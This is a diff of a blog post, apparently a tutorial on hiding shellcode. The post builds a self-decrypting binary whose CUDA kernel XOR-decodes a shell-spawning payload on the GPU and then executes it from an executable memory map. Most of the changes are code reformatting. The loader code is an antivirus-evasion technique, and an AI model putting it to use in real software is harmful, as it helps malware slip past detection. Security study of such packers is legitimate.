@@ -18,7 +18,7 @@ First of all what is our program going to do? Well it will spawn a shell. The as
 
 {% highlight assembly %}
 global _shell
- 
+
 _shell:
 xor ecx, ecx
 mul ecx
@@ -34,50 +34,51 @@ You can find codes like this freely available on the internet (this one is writt
 
 So now that we have our assembly code, we compile it to an object file:
 
-{% highlight bash %} 
+{% highlight bash %}
 nasm shell.asm -f elf32 -o shell.o
 {% endhighlight %}
 
 Our code for the self-decrypting binary is this one, written in C for CUDA:
 
-{% highlight c %} 
+{% highlight c %}
 #include <stdio.h>
 #include <sys/mman.h>
 #include <cuda.h>
  
 #define len 21
  
-__global__ void decrypt(unsigned char *code){
- 
-int indx = threadIdx.x;
-code[indx] ^= 12;
- 
+__global__ void decrypt(unsigned char *code)
+{
+	int indx = threadIdx.x;
+	code[indx] ^= 12;
 }
  
 extern "C" void _shell();
  
-int main(void){
+int main(void)
+{
  
-unsigned char *p = (unsigned char*)_shell;
-unsigned char *d_shell,*h_shell;
- 
-h_shell = (unsigned char *)malloc(sizeof(char)*len);
- 
-int i;
-for(i=0;i<len;i++){
-h_shell[i] = *p;
-p++;
-}
-cudaMalloc((void **) &d_shell, sizeof(char)*len);
-cudaMemcpy(d_shell, h_shell, sizeof(char)*len, cudaMemcpyHostToDevice);
-decrypt<<<1,len>>>(d_shell);
-cudaMemcpy(h_shell, d_shell, sizeof(char)*len, cudaMemcpyDeviceToHost);
-cudaFree(d_shell);
-char *d=(char *)mmap(NULL, len,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON,-1,0);
- 
-memcpy(d,h_shell,len);
- 
-((void(*)(void))d)();
+	unsigned char *p = (unsigned char*) _shell;
+	unsigned char *d_shell, *h_shell;
+	 
+	h_shell = (unsigned char *) malloc(sizeof(char) * len);
+	 
+	int i;
+	for(i = 0; i < len; i++)
+	{
+		h_shell[i] = *p;
+		p++;
+	}
+	cudaMalloc((void **) &d_shell, sizeof(char) * len);
+	cudaMemcpy(d_shell, h_shell, sizeof(char) * len, cudaMemcpyHostToDevice);
+	decrypt<<< 1, len >>>(d_shell);
+	cudaMemcpy(h_shell, d_shell, sizeof(char) * len, cudaMemcpyDeviceToHost);
+	cudaFree(d_shell);
+	char *d = (char *) mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON,-1,0);
+	 
+	memcpy(d, h_shell, len);
+	 
+	((void(*)(void))d)();
 }
 {% endhighlight %}
 
@@ -121,8 +122,8 @@ Now we simply encrypt the op codes. I used xor 12 so my output is this:
 
 After that we save our file and if we execute it we can see that a shell spawns!
 
-<figure>
-<a href="https://stack0verflow.files.wordpress.com/2011/12/selection_011.png"></a>
+<figure >
+<a href="https://stack0verflow.files.wordpress.com/2011/12/selection_011.png"><img src="https://stack0verflow.files.wordpress.com/2011/12/selection_011.png"></a>
 </figure>
 
 We open our hex editor, load our binary and replace our old _shell function with our encrypted one:
